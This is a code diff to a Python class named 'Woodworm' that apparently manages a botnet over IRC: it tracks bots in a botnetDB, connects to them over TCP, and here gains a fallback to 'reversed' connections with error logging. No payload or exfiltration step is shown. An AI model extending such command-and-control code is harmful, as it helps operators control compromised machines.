@@ -9,6 +9,7 @@ import socket
 import os
 import datetime
 
+
 class Woodworm:
     def __init__(self, pathToFiles, ircNick, channel, domain, ircServer, ircServerPort, tcpPort):
         self.syslog = logger.Logger()
@@ -23,7 +24,6 @@ class Woodworm:
         self.tcpPort = tcpPort
 
         self.myContext = context.Context(self.ircNick, self.my_ip, self.tcpPort)
-        self.myContext.set_connected(True)
 
         self.tcp_server = tcp_services.TCPServer(self.my_ip, self.tcpPort)        
         self.tcp_server.onConnectionRegistered.subscribe(self.tcpServer_onConnectionReceived)
@@ -76,7 +76,6 @@ class Woodworm:
             bot = context.Context(nick, ip, port)
             tcpClient = tcp_services.TCPClient(ip, port)
             bot.set_tcp_connection(await tcpClient.connect())
-            bot.set_connected(True) 
             self.botnetDB.add_bot(bot)
 
             self.syslog.log(f"Bot added to DB: nick: {nick}, ip: {ip} port: {port}", level=logger.LogLevel.INFO)
@@ -135,6 +134,15 @@ class Woodworm:
             return
 
         connection = bot.get_tcp_connection()
+        if connection is None:
+            self.syslog.log(f"Bot {receiver} has no connection, trying to use reversed connection", level=logger.LogLevel.WARNING)
+            connection = bot.get_reversed_tcp_connection()
+        
+        if connection is None:
+            self.syslog.log(f"Bot {receiver} has no active connections", level=logger.LogLevel.ERROR)
+            await irc_connection.send_query(nickname, f"Bot {receiver} has no active connections")
+            return  
+
         if connection.is_sending_data():
             await irc_connection.send_query(nickname, f"Bot {receiver} is busy")
             return
